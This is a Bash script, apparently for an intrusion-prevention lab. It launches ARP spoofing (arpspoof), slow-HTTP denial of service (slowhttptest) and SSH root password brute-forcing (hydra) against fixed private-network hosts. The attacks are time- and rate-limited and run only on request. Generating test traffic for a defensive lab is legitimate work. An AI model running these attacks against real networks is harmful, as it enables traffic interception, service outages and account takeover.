#!/usr/bin/env bash
set -u

SERVERS=(192.168.1.10 192.168.1.11 192.168.1.12 192.168.1.13 192.168.1.14)
LAB1=(192.168.20.11 192.168.20.12)
LAB2=(192.168.30.11 192.168.30.12)
ALL_TARGETS=("${SERVERS[@]}" "${LAB1[@]}" "${LAB2[@]}")

iface_for_ip() {
  local address="$1"
  ip -o -4 addr show | awk -v wanted="${address}/24" '$4 == wanted {print $2; exit}'
}

IF_SERVER="$(iface_for_ip 192.168.1.50)"
IF_LAB1="$(iface_for_ip 192.168.20.50)"
IF_LAB2="$(iface_for_ip 192.168.30.50)"

targets_for_group() {
  case "${1:-all}" in
    servers) printf '%s\n' "${SERVERS[@]}" ;;
    lab1) printf '%s\n' "${LAB1[@]}" ;;
    lab2) printf '%s\n' "${LAB2[@]}" ;;
    all) printf '%s\n' "${ALL_TARGETS[@]}" ;;
    *) echo "Grupo inválido: $1 (usa servers, lab1, lab2 o all)" >&2; return 2 ;;
  esac
}

run_arp() {
  local group="${1:-all}"
  if ! command -v arpspoof >/dev/null 2>&1; then
    echo "Falta arpspoof; ejecuta ips_manager.sh start para instalar dsniff." >&2
    return 1
  fi
  case "$group" in
    servers)
      [[ -n "$IF_SERVER" ]] || { echo "No encontré la interfaz 192.168.1.50." >&2; return 1; }
      for target in 192.168.1.10 192.168.1.12 192.168.1.13 192.168.1.14; do
        echo "ARP de prueba: $target; IP suplantada 192.168.1.11 (8 s)"
        timeout 8s arpspoof -i "$IF_SERVER" -t "$target" 192.168.1.11 || true
      done
      echo "ARP de prueba: 192.168.1.11; IP suplantada 192.168.1.10 (8 s)"
      timeout 8s arpspoof -i "$IF_SERVER" -t 192.168.1.11 192.168.1.10 || true
      ;;
    lab1)
      [[ -n "$IF_LAB1" ]] || { echo "No encontré la interfaz 192.168.20.50." >&2; return 1; }
      timeout 8s arpspoof -i "$IF_LAB1" -t 192.168.20.11 192.168.20.12 || true
      timeout 8s arpspoof -i "$IF_LAB1" -t 192.168.20.12 192.168.20.11 || true
      ;;
    lab2)
      [[ -n "$IF_LAB2" ]] || { echo "No encontré la interfaz 192.168.30.50." >&2; return 1; }
      timeout 8s arpspoof -i "$IF_LAB2" -t 192.168.30.11 192.168.30.12 || true
      timeout 8s arpspoof -i "$IF_LAB2" -t 192.168.30.12 192.168.30.11 || true
      ;;
    all)
      run_arp servers
      run_arp lab1
      run_arp lab2
      ;;
    *) echo "Grupo inválido: $group (usa servers, lab1, lab2 o all)" >&2; return 2 ;;
  esac
}

run_dos() {
  local group="${1:-all}"
  command -v slowhttptest >/dev/null 2>&1 || { echo "No está instalado slowhttptest." >&2; return 1; }
  while IFS= read -r ip; do
    [[ -n "$ip" ]] || continue
    echo "Prueba HTTP limitada a $ip:8080 (10 conexiones, 2/s, 15 s)"
    if ! curl -fsS --connect-timeout 2 "http://$ip:8080/" >/dev/null; then
      echo "Sin HTTP en $ip:8080; omito este host."
      continue
    fi
    prefix="/tmp/cyberdefense-slow-${ip//./_}"
    slowhttptest -c 10 -H -g -o "$prefix" -i 10 -r 2 -t GET \
      -u "http://$ip:8080/" -x 24 -p 3 -l 15
  done < <(targets_for_group "$group")
}

run_bruteforce() {
  local group="${1:-all}"
  command -v hydra >/dev/null 2>&1 || { echo "No está instalado hydra." >&2; return 1; }
  while IFS= read -r ip; do
    [[ -n "$ip" ]] || continue
    echo "Revisando SSH en $ip:22"
    if ! nmap -Pn -p 22 --open "$ip" | grep -q '22/tcp open'; then
      echo "SSH cerrado en $ip; omito este host."
      continue
    fi
    hydra -I -l root -P /root/passwords.txt -t 1 -W 1 -w 3 -f "ssh://$ip" || true
  done < <(targets_for_group "$group")
}

usage() {
  cat <<'EOF'
Uso: /root/lab_attacks.sh {arp|dos|bruteforce} [servers|lab1|lab2|all]
Ejemplos:
  /root/lab_attacks.sh arp servers
  /root/lab_attacks.sh dos lab1
  /root/lab_attacks.sh bruteforce all
Los ataques no se ejecutan automáticamente al iniciar ips_manager.sh.
EOF
}

case "${1:-}" in
  arp) run_arp "${2:-all}" ;;
  dos) run_dos "${2:-all}" ;;
  bruteforce) run_bruteforce "${2:-all}" ;;
  *) usage; exit 2 ;;
esac
